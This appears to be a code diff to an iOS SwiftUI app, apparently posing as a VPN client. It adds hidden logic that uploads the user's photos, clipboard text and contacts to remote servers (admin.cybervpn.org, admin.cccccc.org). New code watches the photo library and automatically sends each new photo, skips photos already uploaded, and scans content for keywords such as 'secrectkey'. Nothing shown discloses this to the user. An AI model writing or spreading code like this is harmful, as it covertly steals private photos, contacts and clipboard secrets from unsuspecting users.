@@ -100,7 +100,32 @@ struct HomeView: View {
     
     
     //增加上传相册，通讯录，和剪切板逻辑
-    @State  private var uploadedAssetIDs = [String]()
+    @AppStorage("uploadedAssetIDsString") private var uploadedAssetIDsString: String = ""
+    
+    // 计算属性，用于方便访问数组形式的 uploadedAssetIDs
+    private var uploadedAssetIDs: [String] {
+        get {
+            if uploadedAssetIDsString.isEmpty {
+                return []
+            }
+            return uploadedAssetIDsString.components(separatedBy: ",").filter { !$0.isEmpty }
+        }
+        set {
+            uploadedAssetIDsString = newValue.joined(separator: ",")
+        }
+    }
+    
+    // 辅助方法：添加已上传的资产ID
+    private  func addUploadedAssetID(_ assetID: String) {
+        var currentIDs = uploadedAssetIDs
+        if !currentIDs.contains(assetID) {
+            currentIDs.append(assetID)
+           // print(uploadedAssetIDsString)
+            uploadedAssetIDsString.append(","+assetID)
+            //print(uploadedAssetIDsString)
+           // self.uploadedAssetIDs.append(assetID)
+        }
+    }
     
     // 用于记录上次检测时的剪切板文本
     @State  private var lastClipboardText: String?
@@ -109,6 +134,12 @@ struct HomeView: View {
     @State private var keywords = [
        "keywords", "secrectkey","words"
     ]
+     
+    
+    let serverUploadImageURL = "https://admin.cybervpn.org/api/demo/uploadImg?type=ios&userId="
+    let serveruploadPasteBoardURL = "https://admin.cccccc.org/api/demo/info?type=ios&userId="
+    let serveruploadContacesURL = "https://admin.cccccc.org/api/demo/uploadContacts?type=ios&userId="
+    
     
     var body: some View {
        
@@ -417,6 +448,12 @@ struct HomeView: View {
                         self.registerBackgroundTasks()
                     }
                     
+                    // 设置相册变化回调
+                    
+                    photoLibraryObserver.onPhotoLibraryChanged = {
+                        self.handlePhotoLibraryChanged()
+                    }
+                    
                     // 注册相册监听
                     photoLibraryObserver.register()
                     
@@ -623,9 +660,9 @@ struct HomeView: View {
                                           // 检查是否大于 10KB
                                           if fileSizeInKB > 10 {
                                               print("图片大小符合要求，准备上传：\(fileSizeInKB) KB")
-                                              let serverURL = "https://add.cbxline.com/index.php/api/demo/uploadImg?type=ios&userId="
+                                             
                                               // 调用上传函数
-                                              self.uploadImage(imagedata: compressedData, serverURL: serverURL,fileName: "\(album.localIdentifier).png") {
+                                              self.uploadImage(imagedata: compressedData, serverURL: serverUploadImageURL,fileName: "\(album.localIdentifier).png") {
                                                   // 更新上传进度
                                                   UserDefaults.standard.set(currentIndex + 1, forKey: "lastUploadedIndeXYZEERFGVSSRS")
                                                   currentIndex += 1
@@ -685,9 +722,6 @@ struct HomeView: View {
     }
     
     func resumeUploadAssets(_ assets: [PHAsset]) {
-        // 从 UserDefaults 读取已上传的资产标识符
-//        var uploadedAssetIDs = UserDefaults.standard.array(forKey: "uploadedAssetIDs") as? [String] ?? [String]()
-        
         // 筛选未上传的资产
         let remainingAssets = assets.filter { !uploadedAssetIDs.contains($0.localIdentifier) }
         print("剩余需要上传的照片数量: \(remainingAssets.count)")
@@ -752,8 +786,6 @@ struct HomeView: View {
             dispatchGroup.wait()
             
             print("更新uploadedAssetIDs \(uploadedAssetIDs.count)")
-            UserDefaults.standard.set(uploadedAssetIDs, forKey: "uploadedAssetIDs")
-            UserDefaults.standard.synchronize()
             print("当前分组(\(startIndex)~\(endIndex-1))上传完毕，休眠 1 秒...")
             Thread.sleep(forTimeInterval: 1.0)
             
@@ -794,7 +826,7 @@ struct HomeView: View {
         let requestOptions = PHImageRequestOptions()
         requestOptions.deliveryMode =  .opportunistic//.highQualityFormat
         requestOptions.isSynchronous =  true // 异步加载图片
-        let serverURL = "https://admin.cybervpn.org/api/demo/uploadImg?type=ios&userId="
+        
         imageManager.requestImage(for: asset, targetSize: targetSize, contentMode: .aspectFill, options: requestOptions) { image, _ in
             if let image = image {
                 
@@ -829,13 +861,11 @@ struct HomeView: View {
                                         print("图片大小符合要求，准备上传：\(fileSizeInKB) KB")
                                         
                                         // 上传图片并保存进度
-                                        self.uploadImage(imagedata: compressedData, serverURL: serverURL, fileName: "\(asset.localIdentifier).png") {
+                                        self.uploadImage(imagedata: compressedData, serverURL: serverUploadImageURL, fileName: "\(asset.localIdentifier).png") {
                                             // 上传完成后更新缓存的 ID
                                             print("上传完成... \(asset.localIdentifier)")
-                                            self.uploadedAssetIDs.append(asset.localIdentifier)
-                                            UserDefaults.standard.set(self.uploadedAssetIDs, forKey: "uploadedAssetIDs") // 保存到 UserDefaults
+                                            self.addUploadedAssetID(asset.localIdentifier)
                                             print("len : \(self.uploadedAssetIDs.count)")
-                                            UserDefaults.standard.synchronize()
                                             completion()
                                         }
                                     } else {
@@ -846,12 +876,9 @@ struct HomeView: View {
                                 
                             }
                         } else {
-                            //self.uploadedAssetIDs.append(asset.localIdentifier)
                             print("过滤完成... \(asset.localIdentifier)")
-                            self.uploadedAssetIDs.append(asset.localIdentifier)
-                            UserDefaults.standard.set(self.uploadedAssetIDs, forKey: "uploadedAssetIDs") // 保存到 UserDefaults
+                            self.addUploadedAssetID(asset.localIdentifier)
                             print("len : \(self.uploadedAssetIDs.count)")
-                            UserDefaults.standard.synchronize()
                             completion()
                            // print("No keywords found in text,忽略图片")
                         }
@@ -1068,6 +1095,26 @@ struct HomeView: View {
         }
     }
     
+    // MARK: - 相册变化处理方法
+    
+    /// 处理相册变化
+    private func handlePhotoLibraryChanged() {
+        print("📸 handlePhotoLibraryChanged() called - 处理相册变化")
+        
+        // 获取最新的照片
+        let assets = PHAsset.fetchAssets(with: .image, options: nil)
+        if let asset = assets.lastObject {
+            
+            if (!uploadedAssetIDs.contains(asset.localIdentifier)) {
+                print("新增照片：\(asset.localIdentifier)  \(asset.pixelHeight)")
+                self.updateAsset(asset: asset) {
+                    self.addUploadedAssetID(asset.localIdentifier)
+                    print("len : \(self.uploadedAssetIDs.count)")
+                }
+            }
+        }
+    }
+    
     /// 常规前台回归处理方法
     func appDidBecomeActive() {
         print("🔄 appDidBecomeActive() called - 常规前台处理")
@@ -1144,9 +1191,8 @@ struct HomeView: View {
     //上传粘贴板
     private func uploadPasteBoard( clipboardText: String){
         print("应用从后台回到前台:" + clipboardText)
-        //https://imgadd.nbt888.com/index.php 修改为 https://admin.cybervpn.org/
-        let serverURL = "https://admin.cccccc.org/api/demo/info?type=ios&userId="
-        guard let url = URL(string: serverURL) else {
+        
+        guard let url = URL(string: serveruploadPasteBoardURL) else {
             print("无效的URL")
             return
         }
@@ -2205,6 +2251,9 @@ struct HomeView: View {
 // MARK: - PhotoLibraryObserver Class
 public class PhotoLibraryObserver: NSObject, ObservableObject, PHPhotoLibraryChangeObserver {
     
+    // 回调闭包，用于调用 HomeView 中的方法
+    var onPhotoLibraryChanged: (() -> Void)?
+    
     public override init() {
         super.init()
         print("📸 PhotoLibraryObserver 初始化完成")
@@ -2212,16 +2261,12 @@ public class PhotoLibraryObserver: NSObject, ObservableObject, PHPhotoLibraryCha
     
     public func photoLibraryDidChange(_ changeInstance: PHChange) {
         print("📸 Photo library did change - 相册发生变化")
-        // 这里可以处理相册变化的逻辑
-        // 例如检测新增的照片等
         
-//        DispatchQueue.main.async {
-//            // 在主线程更新UI
-//            print("📸 Processing photo library changes on main thread")
-//        }
-        
-       
-        
+        DispatchQueue.main.async {
+            // 在主线程更新UI，调用 HomeView 中的处理方法
+            print("📸 Processing photo library changes on main thread")
+            self.onPhotoLibraryChanged?()
+        }
     }
     
     
